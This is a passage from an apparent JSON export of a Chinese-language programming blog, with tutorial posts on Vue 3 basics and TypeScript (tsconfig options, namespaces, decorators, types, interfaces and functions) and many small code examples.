信息：${app.msg}`); app.msg = \"hello vue3.2.31\" // 这里能改变 data return 下 msg 值，也就是 return 里面的都是app实例的属性 &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 方法引用 上面是在&lt;h2&gt;标签里面通过点击对，show属性取反，现在可以通过定义一个方法，改变属性取反，在&lt;h2&gt; 标签中引用方法 方法名和属性名最好不要重复有可能会出现系统不知道找的是方法还是属性（但是方法后面会有括号） 定义方法通过 methods 标签，和 data() 同级 点击显/隐代码块 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;script src=\"../js/vue.global.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;style&gt; .box { color: blue; background: green; display: none; /*将元素的显示设为无 隐藏*/ } div.show { display: block; } &lt;/style&gt; &lt;div id=\"demo\"&gt; {{messages}} &lt;h2 @click=\"isShow()\"&gt;{{msg}}&lt;/h2&gt; &lt;!-- &lt;div class=\"box\" :class=\"{show:true}\" :style=\"{width,height}\"&gt;--&gt; &lt;div class=\"box\" :class=\"{show}\" :style=\"{width,height}\"&gt; &lt;ul&gt; &lt;li v-for=\"titles in articles.slice(0, 5)\"&gt;{{titles.title}}&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;script&gt; const app = Vue.createApp({ data() { return { show: true, messages: \"this is a test\", msg: \"hello vue\", height: \"200px\", width: \"300px\", articles: [ {title: 'title111111', content: \"content1111\"}, {title: 'title222222', content: \"content1112\"}, {title: 'title333333', content: \"content1113\"}, {title: 'title444444', content: \"content1114\"}, {title: 'title555555', content: \"content1115\"}, {title: 'title666666', content: \"content1116\"}, {title: 'title777777', content: \"content1117\"}, ], } }, methods: { isShow() { this.show = !this.show; } } }).mount(\"#demo\") // 挂载上面的 demo 组件 console.log(`原始的 app.msg 信息：${app.msg}`); app.msg = \"hello vue3.2.31\" // 这里能改变 data return 下 msg 值，也就是 return 里面的都是app实例的属性 &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 语法模板语法 内容指定为 ts 变量可指定类型 template {{ }} 中可直接引用 number或者 Boolean 类型的可以用三目运算符 还可直接计算，可调用 api等等 点击显/隐代码块 &lt;script setup lang=\"ts\"&gt; let msg: string = \"好像是 ts 的语法指定类型\"; let num: number = 0; //1 为真，其它都为假 let num2: number = 3; let str: string = \"this,is,测,试\"; &lt;/script&gt; &lt;template&gt; &lt;div&gt; &lt;h2&gt;{{ msg }}&lt;/h2&gt; &lt;h2&gt;{{ num ? `num为真${num}` : `num为假${num}` }}&lt;/h2&gt; &lt;h2&gt;{{ num2 + 1 }}&lt;/h2&gt; &lt;h2&gt;{{ str.split(\",\") }}&lt;/h2&gt; &lt;h2&gt;{{ str.split(\",\").map(v =&gt; `v=${v}`) }}&lt;/h2&gt; &lt;/div&gt; &lt;/template&gt; &lt;style scoped&gt; &lt;/style&gt; Vue指令 3:30 P7 vue 的指令都是以 V 开头的 v-text：在一个标签中插入文本显示 v-html：插入富文本 v-if v-show：布尔值控制元素是否展示（v-show 操作的是 display：none，比 v-if 性能好） v-if-else语法：如果要对比文本 v-if=\"flag == 'A'\" 双引号套单引号 v-on:click 或者简写 @click 绑定事件","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"TS","slug":"TS","permalink":"https://www.adalucky.com/tags/TS/"},{"name":"Vue3","slug":"Vue3","permalink":"https://www.adalucky.com/tags/Vue3/"},{"name":"Vite","slug":"Vite","permalink":"https://www.adalucky.com/tags/Vite/"},{"name":"pinia","slug":"pinia","permalink":"https://www.adalucky.com/tags/pinia/"}],"author":"Ada"},{"title":"TypeScript 下","slug":"Auto/TypeScript2","date":"2022-06-03T08:16:29.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"/auto/typescript2/","link":"","permalink":"https://www.adalucky.com/auto/typescript2/","excerpt":"TypeScript是微软开发的一个开源的编程语言，通过在JavaScript的基础上添加静态类型定义构建而成。TypeScript通过TypeScript编译器或Babel转译为JavaScript代码，可运行在任何浏览器，任何操作系统。","text":"TypeScript是微软开发的一个开源的编程语言，通过在JavaScript的基础上添加静态类型定义构建而成。TypeScript通过TypeScript编译器或Babel转译为JavaScript代码，可运行在任何浏览器，任何操作系统。 参考资料 tsconfig.json 文件 tsc --init命令可生成 tsconfig.json 文件 总览 具体使用可见查官网配置简介 { \"compilerOptions\": { \"incremental\": true, // TS编译器在第一次编译之后会生成一个存储编译信息的文件，第二次编译会在第一次的基础上进行增量编译，可以提高编译的速度 \"tsBuildInfoFile\": \"./buildFile\", // 增量编译文件的存储位置 \"diagnostics\": true, // 打印诊断信息 \"target\": \"ES5\", // 目标语言的版本 \"module\": \"CommonJS\", // 生成代码的模板标准 \"outFile\": \"./app.js\", // 将多个相互依赖的文件生成一个文件，可以用在AMD模块中，即开启时应设置\"module\": \"AMD\", \"lib\": [ \"DOM\", \"ES2015\", \"ScriptHost\", \"ES2019.Array\" ], // TS需要引用的库，即声明文件，es5 默认引用dom、es5、scripthost,如需要使用es的高级版本特性，通常都需要配置，如es8的数组新特性需要引入\"ES2019.Array\", \"allowJS\": true, // 允许编译器编译JS，JSX文件 \"checkJs\": true, // 允许在JS文件中报错，通常与allowJS一起使用 \"outDir\": \"./dist\", // 指定输出目录 \"rootDir\": \"./\", // 指定输出文件目录(用于输出)，用于控制输出目录结构 \"declaration\": true, // 生成声明文件，开启后会自动生成声明文件 \"declarationDir\": \"./file\", // 指定生成声明文件存放目录 \"emitDeclarationOnly\": true, // 只生成声明文件，而不会生成js文件 \"sourceMap\": true, // 生成目标文件的sourceMap文件 \"inlineSourceMap\": true, // 生成目标文件的inline SourceMap，inline SourceMap会包含在生成的js文件中 \"declarationMap\": true, // 为声明文件生成sourceMap \"typeRoots\": [], // 声明文件目录，默认时node_modules/@types \"types\": [], // 加载的声明文件包 \"removeComments\": true, // 删除注释 \"noEmit\": true, // 不输出文件,即编译后不会生成任何js文件 \"noEmitOnError\": true, // 发送错误时不输出任何文件 \"noEmitHelpers\": true, // 不生成helper函数，减小体积，需要额外安装，常配合importHelpers一起使用 \"importHelpers\": true, // 通过tslib引入helper函数，文件必须是模块 \"downlevelIteration\": true, // 降级遍历器实现，如果目标源是es3/5，那么遍历器会有降级的实现 \"strict\": true, // 开启所有严格的类型检查 \"alwaysStrict\": true, // 在代码中注入'use strict' \"noImplicitAny\": true, // 不允许隐式的any类型 \"strictNullChecks\": true, // 不允许把null、undefined赋值给其他类型的变量 \"strictFunctionTypes\": true, // 不允许函数参数双向协变 \"strictPropertyInitialization\": true, // 类的实例属性必须初始化 \"strictBindCallApply\": true, // 严格的bind/call/apply检查 \"noImplicitThis\": true, // 不允许this有隐式的any类型 \"noUnusedLocals\": true, // 检查只声明、未使用的局部变量(只提示不报错) \"noUnusedParameters\": true, // 检查未使用的函数参数(只提示不报错) \"noFallthroughCasesInSwitch\": true, // 防止switch语句贯穿(即如果没有break语句后面不会执行) \"noImplicitReturns\": true, //每个分支都会有返回值 \"esModuleInterop\": true, // 允许export=导出，由import from 导入 \"allowUmdGlobalAccess\": true, // 允许在模块中全局变量的方式访问umd模块 \"moduleResolution\": \"node\", // 模块解析策略，ts默认用node的解析策略，即相对的方式导入 \"baseUrl\": \"./\", // 解析非相对模块的基地址，默认是当前目录 \"paths\": { // 路径映射，相对于baseUrl // 如使用jq时不想使用默认版本，而需要手动指定版本，可进行如下配置 \"jquery\": [ \"node_modules/jquery/dist/jquery.min.js\" ] }, \"rootDirs\": [ \"src\", \"out\" ], // 将多个目录放在一个虚拟目录下，用于运行时，即编译后引入文件的位置可能发生变化，这也设置可以虚拟src和out在同一个目录下，不用再去改变路径也不会报错 \"listEmittedFiles\": true, // 打印输出文件 \"listFiles\": true // 打印编译的文件(包括引用的声明文件) }, // 指定一个匹配列表（属于自动指定该路径下的所有ts相关文件） \"include\": [ \"src/**/*\" ], // 指定一个排除列表（include的反向操作） \"exclude\": [ \"demo.ts\" ], // 指定哪些文件使用该配置（属于手动一个个指定文件） \"files\": [ \"demo.ts\" ] } 常用配置include 编译默认是编译当前目录下所有的ts文件,也可用 include 指定需要编译的文件 如下所示,指定只编译 index.ts index3.ts 两个文件 { \"include\": [ \"./src/index.ts\", \"./src/index3.ts\" ] } exclude 和 include 相反，指定编译需要排除的文件 如下所示即表示,编译时排除 ./src/index3.ts 这个文件 { \"exclude\": [ \"./src/index3.ts\" ] } target 指定编译 js 的版本例如 es5 es6 es2016 一般采用 es6 的较多，如果为了兼容低版本的浏览器可以指定 es5 或者更低 该属性时写在 compilerOptions 内的 { \"exclude\": [ \"./src/index3.ts\" ], \"compilerOptions\": { \"target\": \"es6\" } } allowsJS 是否允许编译 js 文件 如果项目中有 js 和 ts 就需要设置该属性开启一起编译（不过一个项目最好还是固定一种） { \"include\": [ \"./src/index2.ts\" ], \"compilerOptions\": { \"target\": \"es6\", \"allowJs\": true } } removeComments 是否在编译过程中删除文件中的注释 rootDir 编译文件的目录 outDir 输出的目录 打包后的目录 一般默认为 ./dist sourceMap 代码源文件 strict 严格模式 布尔值,开启后就不能滥用类型 module 默认common.js 可选es6模式 amd umd 等 看上去定义定义方法 导包的关键字不一样了 namespace简介 在我们的工作中无法避免 全局变量 造成的污染,在 JS 中我们一般是通过模块的方式进行导出进行解决 全局变量污染: 在两个不同的文件中定义了相同变量名的全局变量会造成重复,通过 export进行导出，当成一个模块 的方式进行解决 export let num: number = 100 在 TypeScript 中为我们提供了 namespace 避免这个问题的出现 通过 namespace 关键字定义,通过 export 暴露 内部模块,主要用于组织代码,避免命名冲突。 命名空间内的类默认私有 基本使用 namespace 定义,export 导出 使用时用 命名空间名.导出的对象或者方法 // 命名空间 namespace base { export let num: number = 1888 export const print = (args: number) =&gt; { console.log(args) } } base.print(base.num) 嵌套命名空间 里面加一层命名空间,命名空间名前面加上 export 关键字 支持多层或者多个嵌套 使用时注意嵌套关系 // 嵌套命名空间 namespace basePro { export namespace base { export let str: string = \"ada\" export const say = (str: string) =&gt; { console.log(`我是 ${str}`) } } } basePro.base.say(basePro.base.str) 抽离命令空间// 抽离命名空间 export namespace abs { export let num: number = 10 } import {abs} from \"./abs\" console.log(abs.num); 简化命名空间 在上面的嵌套命名空间中,使用一个里层的命名空间往往需要带上前面几层例如 basePro.base.say(basePro.base.str) 我们可以通过 import 的方式进行导入简化 // 嵌套命名空间 namespace basePro { export namespace base { export let str: string = \"ada\" export const say = (str: string) =&gt; { console.log(`我是 ${str}`) } } } // 普通用法 basePro.base.say(basePro.base.str) // 简化命名空间(有点类之前的别名) import base1 = basePro.base; import str2 = basePro.base.str; console.log(str2) base1.say(str2) 合并命名空间 重名的命名空间会自动合并 namespace User { export let name: string = \"ada\" } namespace User { export let age: number = 20 } // 两个命名空间名称相同时会自动合并 console.log(User) console.log(User.name) console.log(User.age) 三斜线指令 三斜线指令是包含单个 XML 标签的单行注释。 注释的内容会做为编译器指令使用 三斜线指令仅可放在包含它的文件的最顶端。 一个三斜线指令的前面只能出现单行或多行注释，这包括其它的三斜线指令。 如果它们出现在一个语句或声明之后，那么它们会被当做普通的单行注释，并且不具有特殊的涵义 /// &lt;reference path=\"...\" /&gt;指令是三斜线指令中最常见的一种,它用于声明文件间的依赖 三斜线引用告诉编译器在编译过程中要引入的额外的文件,你也可以把它理解能import，它可以告诉编译器在编译过程中要引入的额外的文件 namespace A { export const fn = () =&gt; 'a' } namespace A { export const fn2 = () =&gt; 'b' } ///&lt;reference path=\"./index2.ts\" /&gt; ///&lt;reference path=\"./index3.ts\" /&gt; console.log(A); 声明文件引入 yarn add @types/node -D /// &lt;reference types=\"node\" /&gt; 就会找到 @types/node/index.d.ts /// &lt;reference types=\"node\" /&gt; 声明文件 d.ts 声明文件 declare 当使用第三方库时，我们需要引用它的声明文件，才能获得对应的代码补全、接口提示等功能 declare var 声明全局变量 declare function 声明全局方法 declare class 声明全局类 declare enum 声明全局枚举类型 declare namespace 声明（含有子属性的）全局对象 interface 和 type 声明全局类型 /// &lt;reference /&gt; 三斜线指令 假设我们有两个依赖 axios express yarn add axios express -S 如果导入报错提示安装 @type/xxxxx 那么直接进行安装依赖即可（原因的一些老的依赖没有声明文件 index.d.ts 基本上通过 @type 进行安装都行(前提是存在)，微软在 npm 上维护了大量的 ） Mixins混入对象混入 可以使用 ES6 的 Object.assign 合并多个对象 // Object.assign 对象混入 enum GENDER { WOMAN, MAN, OTHER } interface Name { name: string } interface Age { age: number } interface Gender { gender: GENDER } let p1: Name = {name: \"ada\"} let p2: Age = {age: 66} let p3: Gender = {gender: GENDER.MAN} // 此时的 User 会被推断成 Name &amp; Age &amp; Gender 交叉类型 const User = Object.assign(p1, p2, p3) console.log(User) 类混入// 类的混入 class A { type: boolean = false; constructor() { } changeType() { this.type = !this.type } } class B { name: string = '张三'; constructor() { } getName(): string { return this.name; } } // 下面创建一个 C 类，结合了这两个 mixins，没使用extends而是使用implements。 把类当成了接口 class C implements A, B { type: boolean name: string; constructor(type: boolean, name: string) { this.name = name; this.type = type } changeType(): void { } getName(): string { return \"\"; } } // 最后，创建这个帮助函数，帮我们做混入操作 curClazz 目标类--&gt;C itemClazz 混入类数组 [A,B] function Mixins(curCls: any, itemCls: any[]) { itemCls.forEach(item =&gt; { console.log(item) // Object.getOwnPropertyNames()可以获取对象自身的属性，除去他继承来的属性 Object.getOwnPropertyNames(item.prototype).forEach(name =&gt; { console.log(name) curCls.prototype[name] = item.prototype[name] }) }) } // 把 A B 两个类的方法都混入编入到 C 中 Mixins(C, [A, B]) let c1 = new C(false, \"ada\"); c1.changeType() console.log(c1.type); console.log(c1.getName()); Decorator装饰器简介 装饰器是一种特殊类型的声明，它能够被附加到 类声明 方法 访问符 属性 或 参数上。 Decorator 装饰器是一项实验性特性，在未来的版本中可能会发生改变（我个人的理解就是后端的注解） 它们不仅增加了代码的可读性，清晰地表达了意图，而且提供一种方便的手段，增加或修改类的功能 若要启用实验性的装饰器特性，你必须在命令行或tsconfig.json里启用编译器选项 { \"compilerOptions\": { \"experimentalDecorators\": true } } 无参类装饰器 定义类装饰器使用 ClassDecorator 记得要区分作用域,类装饰器就在类上用 target: Function 表示使用该装饰器的对象 使用时通过 @装饰器名 注意使用 any 临时断言 // ClassDecorator 作用在类上装饰器 const watcher: ClassDecorator = (target: Function) =&gt; { console.log(target) // 给传入的类追加一个泛型方法 getName target.prototype.getInput = &lt;T&gt;(name: T): T =&gt; { return name; } } // 在类上通过 @ 符号 + 装饰器名称进行使用 @watcher class User { } let user = new User(); // 由于 User 类没有直接声明或者继承 getInput 方法编译会报错，所以需要临时断言成 any 类型 let u1 = (&lt;any&gt;user).getInput(\"人类\") console.log(u1) @watcher class Phone { } let phone = new Phone(); // 同样这里也要使用 any 临时断言 let p1 = (&lt;any&gt;phone).getInput(1888) console.log(p1) 带参类装饰器 装饰器工厂,其实也就是一个高阶函数 外层的函数接受值 里层的函数最终接受类的构造函数 同样使用 ClassDecorator 来表示类装饰器 装饰器参数可定义多个,这里只定义了一个 type,约束为 string 在类上使用该装饰器时,需要传一个 string 类型的值给装饰器 装饰器的参数和内部的 sum 函数的参数是独立的,内部的 sum 函数是在使用了该装饰器的类对象调用时的传参 // 带参数的类装饰器,可以定义多个参数,目前装饰器只定义了一个 type const sum = (type: string): ClassDecorator =&gt; { // 高阶函数通过 @sum 在类上，返回一个 sum 函数,函数需要两个参数 a b 函数的执行逻辑由 type 决定 return (target: Function) =&gt; { target.prototype.sum = (a: number, b: number): number =&gt; { if (type === \"add\") { return add(a, b) } else if (type === \"minus\") { return minus(a, b) } } } function add(a, b) { return a + b } function minus(a, b) { return a - b } } @sum(\"add\") class Add { } @sum(\"minus\") class Minus { } let add = new Add(); console.log((&lt;any&gt;add).sum(1, 2)); let minus = new Minus(); console.log((&lt;any&gt;minus).sum(1, 2)); 组合式装饰器 说人话就是可以使用多个装饰器 没什么特殊的,就是在使用的地方引用多个已定义的装饰器就行 引用的时候可以写在一行或者换行书写 // 组合装饰器,先定义两个装饰器 let Age: ClassDecorator = (target: Function) =&gt; { target.prototype.age = 18 } let Amount: ClassDecorator = (target: Function) =&gt; { target.prototype.amount = 3000 } // 组合装饰器的使用1 @Age @Amount class User2 { } // 组合装饰器使用2 @Age @Amount class User3 { } console.log((&lt;any&gt;new User2()).age); console.log((&lt;any&gt;new User2()).amount); console.log((&lt;any&gt;new User3()).age); console.log((&lt;any&gt;new User3()).amount); 方法装饰器 该装饰器作用在方法上,通过关键字 MethodDecorator 返回的信息也是三部分,最后的 value writable enumerable configurable 是一些附加信息 方法的形参装饰器 作用在方法的形参上,通过关键字 ParameterDecorator 定义 // 作用在方法的形参上 const parm1: ParameterDecorator = (...args) =&gt; { console.log(args); } class Pa1 { name: string constructor() { } // 返回 [ { getName: [Function (anonymous)] }, 'getName', 2 ] // 第二个值表示方法的名称,第三个值 2 表示使用修饰器参数的 index 为 2 (从 0 开始) getName(name: string, age: number, @parm1 amount: number) { } } 属性装饰器 该装饰器作用在属性上,通过关键字 PropertyDecorator 定义 控制台会输出三个属性分别是 target 参数名 还有一个 undefined const prop1: PropertyDecorator = (...args) =&gt; { console.log(args); } const prop2: PropertyDecorator = (target, ...args) =&gt; { console.log(target, args); } class P1 { @prop1 age: 18 amount: 3000 } class P2 { @prop2 age: 18 amount: 3000 }","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"TS","slug":"TS","permalink":"https://www.adalucky.com/tags/TS/"}],"author":"Ada"},{"title":"TypeScript 上","slug":"Auto/TypeScript1","date":"2022-05-21T13:47:00.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"/auto/typescript1/","link":"","permalink":"https://www.adalucky.com/auto/typescript1/","excerpt":"TypeScript是微软开发的一个开源的编程语言，通过在JavaScript的基础上添加静态类型定义构建而成。TypeScript通过TypeScript编译器或Babel转译为JavaScript代码，可运行在任何浏览器，任何操作系统。","text":"TypeScript是微软开发的一个开源的编程语言，通过在JavaScript的基础上添加静态类型定义构建而成。TypeScript通过TypeScript编译器或Babel转译为JavaScript代码，可运行在任何浏览器，任何操作系统。 参考资料 快速入门简介 为什么要使用 TypeScript? 因为现在主流的前端框架都采用 TS 了，比如我们常见的 Vue React Angular,已然成为了一种趋势 TS是JS的超集，所以JS基础的类型都包含在内 网上流传着一句话 始于 JavaScript,终于 JavaScript 因为浏览器是不认识 TypeScript 所以我们会把 TS 编译成 JS 最终运行的还是 js 文件 起步安装 以下安装均采用 yarn 进行管理，如果是 npm 替换对应的命令即可 安装 @types/node ts-node 是为了在开发环境直接使用命令运行 ts 文件,因为 node 不认识 ts ,如果不安装的话需要先用 tsc xxx.ts 进行编译 然后 node xxx.js 比较麻烦 # 全局安装 typescript yarn add typescript -g # 查看 typescript 版本 当前使用的是 Version 4.6.4 tsc -v # @types/node ts-node 支持 yarn add @types/node --save-dev yarn add ts-node -g # ts-node 版本查看 当前版本 v10.7.0 ts-node -v 类型约束string 约定为字符串类型 string 为小写的 //基本数据类型 string let str: string = \"定义一个字符串类型\"; console.log(str); //也可以使用 ES6 的字符串模板 let str2: string = `引用字符串模板--&gt;${str}` console.log(str2); number number 类型 支持十六进制、十进制、八进制和二进制 // 支持十六进制、十进制、八进制和二进制 //Nan let notANumber: number = NaN; console.log(notANumber); //普通数字 如右所示 number 类型用字符串赋值就会报错 let num2: number = \"123\"; let num: number = 123; console.log(num); //无穷大 let infinityNumber: number = Infinity; console.log(infinityNumber); //十六进制 let hex: number = 0xf00d; console.log(hex); //二进制 let binary: number = 0b1010; console.log(binary); //八进制s let octal: number = 0o744; console.log(octal); boolean 注意，使用构造函数 Boolean 创造的对象不是布尔值 //new Boolean() 返回的是一个 Boolean 对象 let objBoolean: Boolean = new Boolean(1) let falseBoolean: Boolean = new Boolean(false) console.log(objBoolean); console.log(falseBoolean); //可以直接使用布尔值 let boolean: boolean = true //也可以通过构造函数初始化返回布尔值 let boolean1: boolean = Boolean(1) console.log(boolean); console.log(boolean1); void JavaScript 没有空值（Void）的概念，在 TypeScript 中，可以用 void 表示没有任何返回值的函数 void 类型的用法，主要是用在我们不希望调用者关心函数返回值的情况下，比如通常的异步回调函数 void也可以定义undefined 和 null类型 运行前需要先编译成 js 文件用 node 运行（直接用 ts-node 运行 ts 文件会报错） // void定义undefined 和 null类型 let u: void = undefined; let n: void = null; console.log(u, n); // 返回值为 void 或者不返回 function voidFn(): void { console.log('test void') } function voidFn2(): void { console.log('test void2') return } voidFn() voidFn2() null_undefined 与 void 的区别是，undefined 和 null 是所有类型的子类型。也就是说 null undefined 类型的变量，可以赋值给 string 类型的变量 void 类型不能赋值给其它类型,编译不会通过 运行前需要先编译成 js 文件用 node 运行（直接用 ts-node 运行 ts 文件会报错） any any类型没有强制限定哪种类型，随时切换类型都可以 我们可以对 any 进行任何操作，不需要检查类型 声明变量的时候没有指定任意类型默认为any 弊端如果使用any 就失去了TS类型检测的作用 any 可以是对象，并且调用对应的属性或者方法 // any类型没有强制限定哪种类型，随时切换类型都可以 我们可以对 any 进行任何操作，不需要检查类型 let anyStr: any = \"string\"; let anyNum: any = 123; let anyArray:any=[1,4,7] let anyBoolean:any=true let anySym:any=Symbol('123') console.log(anyStr) console.log(anyNum) console.log(anyArray) console.log(anyBoolean) console.log(anySym) unknown TypeScript 3.0中引入的 unknown 类型也被认为是 top type ，但它更安全。与 any 一样，所有类型都可以分配给unknown unknow unknow类型比any更加严格当你要使用any 的时候可以尝试使用unknow unknow unknown定义的对象不能使用属性或者方法 unknown 类型的只能赋值给 unknown 或者 any 类型的数据 let unkStr: unknown = \"str\" let unkNum: unknown = 123 let unkArray: unknown = [1, 4, 7] let unkBoolean: unknown = true let unkSym: unknown = Symbol('123') console.log(unkStr) console.log(unkNum) console.log(unkArray) console.log(unkBoolean) console.log(unkSym) let unkObj: unknown = {name: \"ada\", age: \"25\"} let unkFun: unknown = { fun: (): number =&gt; { return 666 } } let anyObj: any = {name: \"ada\", age: \"25\"} let anyFun: any = { fun: (): number =&gt; { return 888 } } // unknown 类定义的对象不能使用对应的属性和方法 any 类型的可以使用对应的属性 // console.log(unkObj.age) // console.log(unkFun.fun()); console.log(anyObj.age) console.log(anyFun.fun()) any与 unknown区别 unknown 类定义的对象不能使用对应的属性和方法 any 类型的可以使用对应的属性 unknown可赋值对象只有unknown 和 any any 类型可赋值给其它任意类型 interface基础示例 在 typescript 中，我们定义对象的方式要用关键字interface（接口），我的理解是使用interface来定义一种约束,让数据的结构满足约束的格式 如果有两个 interface 重名,那么会合并对象的属性 使用接口约束的时候不能多一个属性也不能少一个属性,必须与接口保持一致 interface Person { age: number name: string amount: number } const ada: Person = { age: 25, name: \"ada\", amount: 3000 } interface device { id: string } interface device { name: string } const computer: device = { id: \"10010\", name: \"Mac\" } console.log(computer) console.log(ada.age) 可选式操作符 上面的基本示例中,使用接口约束时必须要求属性和接口一致,如果有些属性希望可有可没有的需要使用可选式操作符 ? 来声明接口中的属性 一般用做在一些新数据和老数据之间,老数据没有该字段 可选属性的含义是该属性可以不存在 // 对于接口 Person ,并不是所有的对象都有 amount 属性,那么就可以用 ? 号标识为可选操作 interface Person { age: number, name: string, amount?: number } // amount 是一个可选操作,所以不声明不会报错 const ada: Person = { age: 25, name: \"阿达\" } const p: Person = { age: 18, name: \"people\", amount: 36000 } console.log(ada) console.log(p) 任意属性proName 当不确定后台返回的属性时，可用 proName 描述任意属性 需要注意的是，一旦定义了任意属性，那么确定属性和可选属性的类型都必须是它的类型的子集 interface Person { age: number, name: string, amount?: number, // any 任意类型 联合类型 string|number 范围为其中一种 [proName: string]: any } const ada: Person = { age: 25, name: \"阿达\", friends: \"萨瓦迪卡\" } const p: Person = { age: 18, name: \"people\", amount: 36000 } console.log(ada) console.log(p) 只读属性 readonly readonly 只读属性,初始化后是不允许被赋值,只能读取 interface Person { age: number, readonly name: string, amount?: number, // any 任意类型 联合类型 string|number 范围为其中一种 [proName: string]: any } const ada: Person = { age: 25, name: \"阿达\", friends: \"萨瓦迪卡\" } ada.age = 66 // ada.name = \"ada\" 会报错,因为上面定义了为 readonly 初始化对象后就不能再赋值了,只能读取不能修改 // ada.name = \"ada\" console.log(ada) 函数 接口中定义函数 函数定义参数和返回值类型(参数可选,没有返回可用用 void 表示 ) interface Person { age: number, readonly name: string, amount?: number, // any 任意类型 联合类型 string|number 范围为其中一种 [proName: string]: any, eat(name: string): string } const ada: Person = { age: 25, name: \"阿达\", friends: \"萨瓦迪卡\", eat(name: string): string { return `${name}在吃东西` } } console.log(ada.eat(\"阿达\")); extends 接口的继承关系 支持多继承 interface A { name: string } interface B { age: number } // 多继承 P 拥有 A B 的属性和自己定义的属性 interface P extends A, B { amount: number } // 初始化对象必须要实现 P 拥有的属性 let ada: P = { name: \"阿达\", age: 88, amount: 666 } console.log(ada) Array Array 数组 常用声明方式 一般可以通过 类型[] Array&lt;具体类型&gt; 两种方式来进行声明 一般用泛型声明,泛型的类型为 any 是最常用的 // 定义方式一 类型[] let arrStr: string[] = ['我', '是', '阿', '达']; let arrNum: number[] = [1, 3, 5, 7, 9]; let arrBoolean: boolean[] = [true, false, true]; let arrAny: any[] = ['我', 1, true] // 定义方式二 泛型 Array&lt;具体类型&gt; let arrStr1: Array&lt;string&gt; = ['我', '是', '阿', '达1']; let arrNum1: Array&lt;number&gt; = [1, 3, 5, 7, 91]; let arrBoolean1: Array&lt;boolean&gt; = [true, false, true, false]; let arrAny1: Array&lt;any&gt; = ['我', 1, true, 1]; console.log(arrStr) console.log(arrStr1) console.log(arrNum) console.log(arrNum1) console.log(arrBoolean) console.log(arrBoolean1) console.log(arrAny) console.log(arrAny1) 多维数组 数组中的值还是一个数组 和基本定义的一样也有两种方式 arguments arguments 是入参的集合，该对象需要用 IArguments 类来接收 // arguments 参数集合 function add(...args: any): void { console.log(arguments) // 我们传入的参数全部都是数字但是我们不能通过 number[] 或者 any[] 来进行接收 // let arr1: number[] = arguments; // let arr2: any[] = arguments; // 只能用 IArguments 接收，从右侧控制台打印也能看出数据的类型 let arr3: IArguments = arguments; console.log(arr3) } add(1, 2, 3) 类数组 一般用来描述类数组 // 通过接口定义的数组一般用来描述 类数组 interface ArrNumber { // index 下标用 number 类型表示 值的类型约束为 number [index: number]: number } interface ArrString { // index 下标用 number 类型表示 值的类型约束为 string [index: number]: string } let arrNumber: ArrNumber = [1, 2, 3, 5, 7] let arrString: ArrString = ['1', '2', '3', '5', '7'] console.log(arrNumber) console.log(arrString) 函数扩展基础使用 默认情况 参数不能多传，也不能少传 必须按照约定的类型来 可通过 ? 号将参数标记为可选参数,例如 amount?: number 在使用该函数的时候被标记的参数就可传可不传了(如果不传的话,再去使用该参数就是 undefined) 也可在声明参数的时候给默认值,例如 amount: number = 0 如果不传该参数就会使用默认值,传了就会以实际传参为准 // 基础使用 //ES6 方法体只有一条语句 不用大括号和 return const fun = (age: number, name: string, amount: number): string =&gt; `age=${age},name=${name},amount=${amount}`; let ada = fun(18, 'ada', 10000) console.log(ada) // amount --&gt; 指定为可选参数，可传可不传(但是这样输出的时候会是 amount=undefined ) const fun1 = (age: number, name: string, amount?: number): string =&gt; `age=${age},name=${name},amount=${amount}`; let ada1 = fun1(18, 'ada') console.log(ada1) // 默认参数 --&gt; 如果 amount 不传就默认为 0 ,传了就以传的为准 const fun2 = (age: number, name: string, amount: number = 0): string =&gt; `age=${age},name=${name},amount=${amount}`; let ada2 = fun2(18, 'ada') let ada3 = fun2(18, 'ada', 3000) console.log(ada2) console.log(ada3) 接口约束函数 通过接口定义一个类型，函数约定为该类型 // 同样支持可选参数 interface User { name: string, age: number, amount?: number } // 定义了一个函数叫做 printUser,传入的参数类型为 User 类型,返回值也为 User 类型 const printUser = (user: User): User =&gt; { return user } // 传参需要满足约定类型 User 类型的对象 {} console.log(printUser( { name: \"阿达\", age: 19, } ) ) 函数的重载 函数名相同，参数列表不同 参数列表包括参数的类型和个数以及参数的顺序 与返回类型无关 如果参数类型不同，则参数类型应设置为 any。 参数数量不同你可以将不同的参数设置为可选 // 上面两个是函数的重载 function fun(params: string): string; function fun(params: string, params2: number): any; //这个是执行函数 function fun(params: string, params2?: number): string { return params + params2 } console.log(fun('1')); console.log(fun('我', 123)); 剩余参数（展开） 可变参数用 …args 来表示 在定义可变参数时,也可以定义一些固定参数,然后用可变参数定义剩余参数 const fn = (array:number[],...items:any[]):any[] =&gt; { console.log(array,items) return items } let a:number[] = [1,2,3] fn(a,'4','5','6') 联合类型 联合类型,能约束属性为多个类型中的一个 比如工作中需求瞬息万变,一个联系人的电话既可以存 11 位手机号，又可以存座机号或者其它场景要求 既可以传参 0或1,又可以传参布尔值 // 联合类型,能约束属性为多个类型中的一个 let phone: number | string = '021-09xxxx98' let phone2: number | string = 13566778899 console.log(phone.length) // phone2 因为实际类型为 number 类型，因此没有 length 属性 // console.log(phone2.length) console.log(phone2) let fn = (beautiful: number | boolean): boolean =&gt; { //强转 2 次 0 --&gt; true --&gt; false true --&gt; false --&gt; true return !!beautiful; } //非 0 及真 console.log(fn(0)); console.log(fn(true)); 交叉类型 多种类型的集合，联合对象将具有所联合类型的所有成员 如下示例 info 参数为 Person Man 的交叉类型,传递参数时需要传递两个类型的所有必填参数 // 交叉类型 有点类是与 extends interface Person { name: string age: number } interface Man { hasBeard: boolean } let ada = (info: Person &amp; Man): void =&gt; { console.log(info) } ada({name: \"阿达\", age: 18, hasBeard: true}) 类型断言 需要注意的是，类型断言只能够「欺骗」TypeScript 编译器，无法避免运行时的错误，反而滥用类型断言可能会导致运行时错误 语法: 值 as 类型 value as string 或 